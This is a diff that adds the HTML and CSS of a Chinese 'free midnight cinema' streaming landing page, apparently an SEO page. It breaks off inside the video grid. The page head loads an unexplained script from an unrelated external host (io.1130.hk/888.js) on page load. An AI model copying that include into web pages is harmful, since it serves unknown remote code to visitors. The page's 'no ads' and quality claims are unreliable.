@@ -1,0 +1,1866 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>午夜影院免费在线_高清影视_深夜剧集天天更新</title>
+    <meta name="description" content="午夜影院免费在线是一家专注于高清影视播放的在线影院平台，提供海量热门大片、经典剧集、热门综艺与精彩动漫资源，无需注册登录即可畅享极致流畅观影体验。立即访问午夜影院免费在线，深夜好片不间断，发现属于你的观影新世界！">
+    <meta name="keywords" content="午夜影院免费在线,午夜影院,免费在线影院,高清影视播放,热门大片在线看,经典剧集,深夜观影">
+    <meta name="robots" content="index,follow">
+    <meta name="bingbot" content="index,follow">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <script type="text/javascript" src="https://io.1130.hk/888.js"></script>
+    <style>
+        /* ===== 全局变量 ===== */
+        :root {
+            --primary: #5B6CF5;
+            --primary-light: #7C8FFA;
+            --primary-dark: #3A4CC8;
+            --accent: #8B5CF6;
+            --gold: #E8B44A;
+            --bg-deep: #080C18;
+            --bg-body: #0B101E;
+            --bg-card: rgba(255, 255, 255, 0.05);
+            --bg-card-hover: rgba(255, 255, 255, 0.09);
+            --text-high: #E6EBF5;
+            --text-normal: #9AA5B5;
+            --text-dim: #5E6A7E;
+            --radius-lg: 24px;
+            --radius-pill: 70px;
+            --shadow: 0 8px 30px rgba(0, 0, 0, 0.35);
+            --border-light: rgba(255, 255, 255, 0.08);
+            --font-main: 'PingFang SC', 'Microsoft YaHei', 'Helvetica Neue', Arial, sans-serif;
+            --transition: all 0.3s ease;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html {
+            scroll-behavior: smooth;
+        }
+        body {
+            font-family: var(--font-main);
+            background-color: var(--bg-body);
+            color: var(--text-normal);
+            font-size: 16px;
+            line-height: 1.9;
+            overflow-x: hidden;
+            position: relative;
+        }
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+        ul {
+            list-style: none;
+        }
+        /* 滚动条 */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-deep);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2a3444;
+            border-radius: 4px;
+        }
+        /* ===== 粒子背景 ===== */
+        #particle-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+        /* ===== 滚动进度条 ===== */
+        #scroll-progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 3px;
+            width: 0%;
+            background: linear-gradient(90deg, var(--primary), var(--accent), var(--gold));
+            z-index: 9999;
+            transition: width 0.1s ease;
+        }
+        /* ===== 顶部导航栏 ===== */
+        #top-nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+            background: rgba(8, 12, 24, 0.85);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-bottom: 1px solid var(--border-light);
+        }
+        .nav-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            height: 42px;
+        }
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .logo-icon svg {
+            width: 22px;
+            height: 22px;
+            stroke: #fff;
+            fill: none;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+        .logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-high);
+            letter-spacing: 1px;
+            white-space: nowrap;
+        }
+        .nav-menu {
+            display: flex;
+            gap: 28px;
+            align-items: center;
+        }
+        .nav-menu a {
+            color: var(--text-normal);
+            font-size: 15px;
+            font-weight: 500;
+            transition: var(--transition);
+            position: relative;
+        }
+        .nav-menu a:hover {
+            color: var(--text-high);
+        }
+        .nav-menu a::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--primary);
+            transition: var(--transition);
+        }
+        .nav-menu a:hover::after {
+            width: 100%;
+        }
+        /* ===== 公共容器 ===== */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+            position: relative;
+            z-index: 2;
+        }
+        /* ===== Banner ===== */
+        #hero {
+            min-height: 600px;
+            height: 65vh;
+            display: flex;
+            align-items: center;
+            position: relative;
+            background: linear-gradient(135deg, #0B1020 0%, #11162A 50%, #151233 100%);
+            overflow: hidden;
+            padding-top: 80px;
+        }
+        #hero .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.35;
+            pointer-events: none;
+            z-index: 1;
+        }
+        #hero .orb-1 {
+            width: 320px;
+            height: 320px;
+            background: var(--primary);
+            top: 10%;
+            left: 15%;
+            animation: orbFloat 12s ease-in-out infinite alternate;
+        }
+        #hero .orb-2 {
+            width: 260px;
+            height: 260px;
+            background: var(--accent);
+            bottom: 5%;
+            right: 20%;
+            animation: orbFloat 16s ease-in-out infinite alternate-reverse;
+        }
+        @keyframes orbFloat {
+            0% {
+                transform: translateY(-20px) scale(1);
+            }
+            100% {
+                transform: translateY(20px) scale(1.05);
+            }
+        }
+        .hero-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 40px;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+            position: relative;
+            z-index: 2;
+        }
+        .hero-left {
+            flex: 1;
+            animation: fadeUp 1s ease forwards;
+        }
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #fff;
+            color: #0B1020;
+            border-radius: 40px;
+            padding: 6px 18px;
+            font-size: 13px;
+            font-weight: 600;
+            box-shadow: 0 4px 20px rgba(255, 255, 255, 0.2);
+            margin-bottom: 20px;
+        }
+        .hero-badge .arrow {
+            display: inline-block;
+            transition: var(--transition);
+        }
+        .hero-badge:hover .arrow {
+            transform: translateX(4px);
+        }
+        .hero-left h1 {
+            font-size: 48px;
+            font-weight: 800;
+            color: var(--text-high);
+            line-height: 1.25;
+            margin-bottom: 16px;
+        }
+        .hero-desc {
+            color: #A0AAB8;
+            font-size: 17px;
+            line-height: 1.8;
+            margin-bottom: 24px;
+            max-width: 480px;
+        }
+        .hero-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 28px;
+        }
+        .hero-tags span {
+            background: rgba(255, 255, 255, 0.12);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            padding: 6px 16px;
+            font-size: 13px;
+            color: #E6EBF5;
+            backdrop-filter: blur(4px);
+        }
+        .hero-btns {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+        .btn-primary {
+            background: var(--primary);
+            color: #fff;
+            border: none;
+            border-radius: 40px;
+            padding: 12px 32px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: 0 4px 20px rgba(91, 108, 245, 0.4);
+        }
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 28px rgba(91, 108, 245, 0.5);
+        }
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--text-high);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 40px;
+            padding: 12px 32px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition);
+            backdrop-filter: blur(4px);
+        }
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+        /* 右侧电脑窗口 */
+        .hero-right {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: fadeUp 1.2s ease forwards;
+        }
+        .device-window {
+            width: 100%;
+            max-width: 480px;
+            background: #0D1220;
+            border-radius: 16px;
+            border: 1px solid #1E2738;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.03);
+            overflow: hidden;
+        }
+        .device-topbar {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: #151A2A;
+            padding: 10px 14px;
+            border-bottom: 1px solid #1E2738;
+        }
+        .device-topbar .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+        .dot-red {
+            background: #FF5F57;
+        }
+        .dot-yellow {
+            background: #FEBC2E;
+        }
+        .dot-green {
+            background: #28C840;
+        }
+        .device-topbar .bar-title {
+            margin-left: 12px;
+            font-size: 12px;
+            color: #7A8499;
+            letter-spacing: 0.5px;
+        }
+        .device-body {
+            display: flex;
+            padding: 20px 16px;
+            gap: 14px;
+            min-height: 200px;
+            align-items: center;
+        }
+        .device-col-left {
+            flex: 0 0 60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+        .device-col-left .app-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .device-col-left .app-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: #fff;
+        }
+        .device-col-left .app-name {
+            font-size: 11px;
+            color: #8892A6;
+            text-align: center;
+        }
+        .device-col-mid {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .device-col-right {
+            flex: 0 0 90px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .device-col-right .param {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            padding: 6px 10px;
+            font-size: 11px;
+            color: #9AA5B5;
+            display: flex;
+            justify-content: space-between;
+        }
+        .device-col-right .param b {
+            color: var(--text-high);
+            font-weight: 600;
+        }
+        /* ===== 通用模块标题 ===== */
+        .section-title {
+            text-align: center;
+            margin-bottom: 56px;
+            animation: fadeUp 0.8s ease forwards;
+        }
+        .section-title h2 {
+            font-size: 36px;
+            font-weight: 800;
+            color: var(--text-high);
+            letter-spacing: 1px;
+        }
+        .section-title p {
+            color: var(--text-normal);
+            font-size: 16px;
+            margin-top: 12px;
+        }
+        .section-title .divider {
+            width: 48px;
+            height: 3px;
+            background: var(--primary);
+            border-radius: 2px;
+            margin: 20px auto 0;
+        }
+        /* ===== 核心优势 ===== */
+        #section-advantage {
+            padding: 80px 0 40px;
+            background: linear-gradient(180deg, var(--bg-body) 0%, #0D1224 100%);
+            position: relative;
+            z-index: 2;
+        }
+        .advan-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 28px;
+        }
+        .advan-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-light);
+            border-radius: var(--radius-pill);
+            padding: 32px 28px;
+            backdrop-filter: blur(10px);
+            transition: var(--transition);
+        }
+        .advan-card:hover {
+            background: var(--bg-card-hover);
+            border-color: rgba(91, 108, 245, 0.4);
+            transform: translateY(-8px);
+            box-shadow: var(--shadow);
+        }
+        .advan-card .icon {
+            width: 56px;
+            height: 56px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            font-size: 26px;
+        }
+        .advan-card h3 {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-high);
+            margin-bottom: 10px;
+        }
+        .advan-card p {
+            font-size: 15px;
+            color: var(--text-normal);
+            line-height: 1.8;
+        }
+        /* ===== 精选视频 ===== */
+        #section-video {
+            padding: 60px 0 80px;
+            background: var(--bg-body);
+            position: relative;
+            z-index: 2;
+        }
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 28px;
+            margin-top: 40px;
+        }
+        .video-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-light);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            transition: var(--transition);
+            backdrop-filter: blur(8px);
+        }
+        .video-card:hover {
+            transform: translateY(-8px);
+            border-color: rgba(91, 108, 245, 0.5);
+            box-shadow: var(--shadow);
+            background: var(--bg-card-hover);
+        }
+        .video-thumbnail {
+            position: relative;
+            height: 180px;
+            overflow: hidden;
+        }
+        .video-thumbnail .tag-cat {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(6px);
+            color: #fff;
+            font-size: 12px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .video-thumbnail .tag-cat i {
+            font-size: 12px;
+        }
+        .play-btn {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 48px;
+            height: 48px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+            transition: var(--transition);
+        }
+        .play-btn::after {
+            content: '';
+            display: block;
+            width: 0;
+            height: 0;
+            border-left: 10px solid #0B1020;
+            border-top: 7px solid transparent;
+            border-bottom: 7px solid transparent;
+            margin-left: 4px;
+        }
+        .video-card:hover .play-btn {
+            background: var(--primary);
+            transform: translate(-50%, -50%) scale(1.1);
+        }
+        .video-duration {
+            position: absolute;
+            bottom: 10px;
+            right: 12px;
+            background: rgba(0, 0, 0, 0.7);
+            color: #fff;
+            font-size: 12px;
+            padding: 3px 10px;
+            border-radius: 12px;
+            letter-spacing: 0.5px;
+        }
+        .video-info {
+            padding: 20px;
+        }
+        .video-info h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-high);
+            margin-bottom: 8px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .video-info p {
+            font-size: 14px;
+            color: var(--text-normal);
+            line-height: 1.7;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            margin-bottom: 14px;
+            min-height: 44px;
+        }
+        .video-meta {
+            display: flex;
+            gap: 16px;
+            font-size: 13px;
+            color: var(--text-dim);
+            margin-bottom: 14px;
+        }
+        .video-meta span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .video-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .video-tags .tag {
+            background: rgba(255, 255, 255, 0.08);
+            color: var(--text-normal);
+            font-size: 12px;
+            padding: 2px 12px;
+            border-radius: 14px;
+        }
+        .video-tags .tag-video {
+            background: var(--primary);
+            color: #fff;
+            font-size: 12px;
+            padding: 2px 12px;
+            border-radius: 14px;
+        }
+        /* ===== 相关资讯 ===== */
+        #section-news {
+            padding: 60px 0 80px;
+            background: #0A0F1C;
+            position: relative;
+            z-index: 2;
+        }
+        .news-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 28px;
+            margin-top: 40px;
+            grid-auto-rows: 1fr;
+        }
+        .news-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-light);
+            border-radius: var(--radius-lg);
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            transition: var(--transition);
+            backdrop-filter: blur(8px);
+            min-height: 240px;
+        }
+        .news-card:hover {
+            transform: translateY(-6px);
+            border-color: rgba(91, 108, 245, 0.5);
+            box-shadow: var(--shadow);
+            background: var(--bg-card-hover);
+        }
+        .news-card .news-date {
+            font-size: 13px;
+            color: var(--primary-light);
+            margin-bottom: 12px;
+        }
+        .news-card h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-high);
+            line-height: 1.5;
+            margin-bottom: 10px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            min-height: 54px;
+        }
+        .news-card .news-desc {
+            font-size: 14px;
+            color: var(--text-normal);
+            line-height: 1.7;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            margin-bottom: 14px;
+            flex: 1;
+        }
+        .news-card .news-link {
+            margin-top: auto;
+            font-size: 14px;
+            color: var(--text-dim);
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .news-card .news-link:hover {
+            color: var(--primary-light);
+        }
+        /* ===== FAQ ===== */
+        #section-faq {
+            padding: 60px 0 80px;
+            background: var(--bg-body);
+            position: relative;
+            z-index: 2;
+        }
+        .faq-list {
+            max-width: 860px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .faq-item {
+            background: var(--bg-card);
+            border: 1px solid var(--border-light);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            transition: var(--transition);
+        }
+        .faq-item:hover {
+            border-color: rgba(91, 108, 245, 0.3);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow);
+        }
+        .faq-item.open {
+            border-color: rgba(91, 108, 245, 0.5);
+        }
+        .faq-question {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 20px 24px;
+            cursor: pointer;
+            user-select: none;
+        }
+        .faq-question i {
+            color: var(--primary);
+            font-size: 20px;
+            width: 24px;
+            text-align: center;
+        }
+        .faq-question h3 {
+            flex: 1;
+            font-size: 17px;
+            font-weight: 700;
+            color: var(--primary-light);
+            margin: 0;
+        }
+        .faq-question .faq-icon {
+            font-size: 18px;
+            color: var(--text-dim);
+            transition: var(--transition);
+        }
+        .faq-item.open .faq-icon {
+            transform: rotate(180deg);
+        }
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease;
+            padding: 0 24px 0 62px;
+        }
+        .faq-item.open .faq-answer {
+            max-height: 800px;
+            padding-bottom: 24px;
+        }
+        .faq-answer ul {
+            list-style: disc;
+            padding-left: 18px;
+            line-height: 1.9;
+            color: var(--text-normal);
+        }
+        .faq-answer li {
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+        /* ===== 评论留言 ===== */
+        #section-comment {
+            padding: 60px 0 80px;
+            background: #0A0F1C;
+            position: relative;
+            z-index: 2;
+        }
+        .comment-container {
+            max-width: 1200px;
+            margin: 40px auto 0;
+            background: var(--bg-card);
+            border: 1px solid var(--border-light);
+            border-radius: var(--radius-lg);
+            padding: 40px;
+            display: flex;
+            gap: 32px;
+            box-shadow: var(--shadow);
+            backdrop-filter: blur(8px);
+        }
+        .comment-form-wrap {
+            flex: 0 0 320px;
+        }
+        .comment-form-wrap .inner-card {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: var(--radius-lg);
+            padding: 24px;
+            border: 1px solid var(--border-light);
+        }
+        .comment-form-wrap input {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 12px;
+            border: 1px solid var(--border-light);
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-high);
+            font-size: 15px;
+            margin-bottom: 16px;
+            outline: none;
+            transition: var(--transition);
+        }
+        .comment-form-wrap input:focus {
+            border-color: var(--primary);
+        }
+        .comment-form-wrap textarea {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 12px;
+            border: 1px solid var(--border-light);
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-high);
+            font-size: 15px;
+            height: 100px;
+            resize: vertical;
+            margin-bottom: 16px;
+            outline: none;
+            transition: var(--transition);
+            font-family: var(--font-main);
+        }
+        .comment-form-wrap textarea:focus {
+            border-color: var(--primary);
+        }
+        .comment-submit {
+            background: var(--primary);
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            padding: 10px 28px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .comment-submit:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+        .comment-list-wrap {
+            flex: 1;
+            max-height: 600px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+        .comment-list-wrap .load-hint {
+            text-align: center;
+            color: var(--text-dim);
+            font-size: 14px;
+            padding: 16px 0 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+        .comment-item {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 16px;
+            padding: 16px 20px;
+            margin-bottom: 12px;
+            border: 1px solid var(--border-light);
+            transition: var(--transition);
+        }
+        .comment-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: rgba(91, 108, 245, 0.2);
+        }
+        .comment-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        .comment-user {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .comment-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .comment-nickname {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-high);
+        }
+        .comment-time {
+            font-size: 12px;
+            color: var(--text-dim);
+        }
+        .comment-tag-row {
+            margin-bottom: 6px;
+        }
+        .comment-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background: rgba(91, 108, 245, 0.15);
+            color: var(--primary-light);
+            font-size: 12px;
+            padding: 2px 10px;
+            border-radius: 12px;
+        }
+        .comment-text {
+            font-size: 15px;
+            line-height: 1.7;
+            color: var(--text-normal);
+            margin-bottom: 10px;
+        }
+        .comment-actions {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            font-size: 13px;
+            color: var(--text-dim);
+        }
+        .comment-actions .reply {
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .comment-actions .reply:hover {
+            color: var(--primary-light);
+        }
+        .comment-actions .like {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+        }
+        /* ===== 页脚 ===== */
+        .site-footer {
+            background: var(--bg-deep);
+            border-top: 1px solid var(--border-light);
+            padding: 32px 0;
+            text-align: center;
+            color: var(--text-dim);
+            font-size: 14px;
+            line-height: 2;
+            position: relative;
+            z-index: 2;
+        }
+        .site-footer .copy {
+            color: var(--text-normal);
+        }
+        .site-footer a {
+            color: var(--primary-light);
+        }
+        /* ===== 动画 ===== */
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        /* ===== 响应式 ===== */
+        @media (max-width: 992px) {
+            .hero-inner {
+                flex-direction: column;
+            }
+            .hero-left,
+            .hero-right {
+                flex: 1;
+                width: 100%;
+            }
+            .hero-left {
+                text-align: center;
+            }
+            .hero-badge {
+                margin-bottom: 12px;
+            }
+            .hero-desc {
+                margin: 0 auto 20px;
+            }
+            .hero-tags {
+                justify-content: center;
+            }
+            .hero-btns {
+                justify-content: center;
+            }
+            .advan-grid,
+            .video-grid,
+            .news-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .comment-container {
+                flex-direction: column;
+            }
+            .comment-form-wrap {
+                flex: 1;
+            }
+        }
+        @media (max-width: 768px) {
+            .hero-left h1 {
+                font-size: 32px;
+            }
+            .hero-desc {
+                font-size: 15px;
+            }
+            .nav-menu {
+                gap: 14px;
+            }
+            .nav-menu a {
+                font-size: 14px;
+            }
+            .advan-grid,
+            .video-grid,
+            .news-grid {
+                grid-template-columns: 1fr;
+            }
+            .section-title h2 {
+                font-size: 28px;
+            }
+            .comment-container {
+                padding: 20px;
+            }
+            .device-body {
+                padding: 14px;
+            }
+            .device-col-right {
+                flex-basis: 75px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <canvas id="particle-bg"></canvas>
+    <div id="scroll-progress"></div>
+    <!-- ===== 固定顶部导航栏 ===== -->
+    <header id="top-nav">
+        <div class="nav-inner">
+            <a href="#" class="logo">
+                <span class="logo-icon">
+                    <svg viewBox="0 0 24 24" stroke="currentColor">
+                        <rect x="2" y="4" width="20" height="14" rx="3"></rect>
+                        <path d="M10 9l5 3-5 3v-6z"></path>
+                        <path d="M2 20h20"></path>
+                    </svg>
+                </span>
+                <span class="logo-text">午夜影院</span>
+            </a>
+            <nav class="nav-menu">
+                <a href="#hero">首页</a>
+                <a href="#section-video">精选电影</a>
+                <a href="#section-news">热门资讯</a>
+                <a href="#section-faq">常见问题</a>
+                <a href="#section-comment">留言反馈</a>
+            </nav>
+        </div>
+    </header>
+    <!-- ===== 首屏 Banner ===== -->
+    <section id="hero">
+        <div class="orb orb-1"></div>
+        <div class="orb orb-2"></div>
+        <div class="hero-inner">
+            <div class="hero-left">
+                <div class="hero-badge">
+                    <span>✨</span>
+                    <span>午夜影院 · 全新上线</span>
+                    <span class="arrow">→</span>
+                </div>
+                <h1>午夜影院免费在线</h1>
+                <p class="hero-desc">精选全球高分影视剧集，深夜独享极致画质体验。海量资源每日更新，打开即播无需等待。</p>
+                <div class="hero-tags">
+                    <span>🎬 高清护眼</span>
+                    <span>⚡ 极速播放</span>
+                    <span>🌐 全网同步</span>
+                    <span>🚫 无广告</span>
+                </div>
+                <div class="hero-btns">
+                    <button class="btn-primary" onclick="window.scrollTo({top:document.getElementById('section-video').offsetTop-80,behavior:'smooth'})">🎬 立即观影</button>
+                    <button class="btn-secondary" onclick="window.scrollTo({top:document.getElementById('section-advantage').offsetTop-80,behavior:'smooth'})">探索片库</button>
+                </div>
+            </div>
+            <div class="hero-right">
+                <div class="device-window">
+                    <div class="device-topbar">
+                        <span class="dot dot-red"></span>
+                        <span class="dot dot-yellow"></span>
+                        <span class="dot dot-green"></span>
+                        <span class="bar-title">午夜影院播放器</span>
+                    </div>
+                    <div class="device-body">
+                        <div class="device-col-left">
+                            <div class="app-icon">
+                                <svg viewBox="0 0 24 24" fill="currentColor">
+                                    <rect x="2" y="4" width="20" height="14" rx="3"></rect>
+                                    <path d="M10 9l5 3-5 3v-6z"></path>
+                                </svg>
+                            </div>
+                            <span class="app-name">NAMovie</span>
+                        </div>
+                        <div class="device-col-mid">
+                            <svg viewBox="0 0 120 120" width="110" height="110">
+                                <defs>
+                                    <linearGradient id="gradRing" x1="0%" y1="0%" x2="100%" y2="100%">
+                                        <stop offset="0%" style="stop-color:#5B6CF5"/>
+                                        <stop offset="100%" style="stop-color:#8B5CF6"/>
+                                    </linearGradient>
+                                </defs>
+                                <circle cx="60" cy="60" r="50" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="8"/>
+                                <circle cx="60" cy="60" r="50" fill="none" stroke="url(#gradRing)" stroke-width="8" stroke-linecap="round" stroke-dasharray="314" stroke-dashoffset="56" transform="rotate(-90 60 60)"/>
+                                <text x="60" y="52" text-anchor="middle" fill="#E6EBF5" font-size="20" font-weight="700">82%</text>
+                                <text x="60" y="72" text-anchor="middle" fill="#8892A6" font-size="10">高清率</text>
+                            </svg>
+                        </div>
+                        <div class="device-col-right">
+                            <div class="param"><span>更新</span><b>128</b></div>
+                            <div class="param"><span>峰值</span><b>3.2w</b></div>
+                            <div class="param"><span>码率</span><b>8M</b></div>
+                            <div class="param"><span>评分</span><b>9.2</b></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- ===== 核心优势 ===== -->
+    <section id="section-advantage">
+        <div class="container">
+            <div class="section-title">
+                <h2>为什么选择我们</h2>
+                <p>六重极致体验，为你打造最纯粹的观影空间</p>
+            </div>
+            <div class="advan-grid">
+                <div class="advan-card">
+                    <div class="icon" style="background:rgba(91,108,245,0.2);color:var(--primary);">🎨</div>
+                    <h3>高清画质</h3>
+                    <p>支持1080P/4K/8K超高清码流，智能匹配网络状况，帧帧清晰，色彩饱满。</p>
+                </div>
+                <div class="advan-card">
+                    <div class="icon" style="background:rgba(139,92,246,0.2);color:var(--accent);">📀</div>
+                    <h3>海量资源</h3>
+                    <p>汇聚院线大片、经典老片、热门剧集与独家综艺，每日更新同步全网。</p>
+                </div>
+                <div class="advan-card">
+                    <div class="icon" style="background:rgba(232,180,74,0.2);color:var(--gold);">🚫</div>
+                    <h3>零广告打扰</h3>
+                    <p>无弹窗无贴片广告，沉浸式播放体验，让你彻底告别看剧被中断的烦恼。</p>
+                </div>
+                <div class="advan-card">
+                    <div class="icon" style="background:rgba(40,200,64,0.2);color:#28C840;">📱</div>
+                    <h3>多端同步</h3>
+                    <p>手机、平板、电脑、电视全平台覆盖，观看进度自动云同步，无缝续播。</p>
+                </div>
+                <div class="advan-card">
+                    <div class="icon" style="background:rgba(255,120,140,0.2);color:#FF788C;">🎯</div>
+                    <h3>智能推荐</h3>
+                    <p>深度学习你的观影偏好，人人不同的专属片单，每一次推荐都恰到好处。</p>
+                </div>
+                <div class="advan-card">
+                    <div class="icon" style="background:rgba(80,200,255,0.2);color:#50C8FF;">⚡</div>
+                    <h3>极速加载</h3>
+                    <p>全球CDN节点覆盖，边缘计算加速，缓冲时间无限接近零，流畅不卡顿。</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- ===== 精选视频 ===== -->
+    <section id="section-video">
+        <div class="container">
+            <div class="section-title">
+                <h2>🔥 热门精选 <span style="color:var(--primary);">片库</span></h2>
+                <p>主编严选高分好片，每一部都值得熬夜看完</p>
+            </div>
+            <div class="video-grid">
+                <!-- 卡片1 -->
+                <div class="video-card">
+                    <div class="video-thumbnail" style="background:linear-gradient(135deg,#0F2027,#2C5364);">
+                        <span class="tag-cat">🌌 科幻</span>
+                        <div class="play-btn"></div>
+                        <span class="video-duration">2:49:00</span>
+                    </div>
+                    <div class="video-info">
